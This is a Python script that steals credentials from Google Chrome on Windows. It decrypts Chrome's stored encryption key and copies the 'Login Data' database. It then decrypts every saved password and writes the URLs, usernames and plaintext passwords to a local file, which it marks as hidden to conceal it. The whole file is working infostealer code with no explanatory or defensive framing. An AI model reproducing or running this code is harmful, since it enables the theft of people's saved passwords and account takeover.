import os
from os import environ, path
import json
from datetime import datetime, timedelta

import base64
import sqlite3

from Crypto.Cipher import AES
import shutil
from base64 import b64decode

import win32crypt
import win32api
import win32con


try:
    def get_chrome_datetime(chromedate):
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

    def get_encryption_key():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""

    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    passwordFile = open("psd.txt", "a")
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        row[4]
        row[5]
        if username or password:
            passwordFile.write(f"Origin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}")
        else:
            continue
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass
    win32api.SetFileAttributes("psd.txt", win32con.FILE_ATTRIBUTE_HIDDEN)
except Exception as e:
    print(e)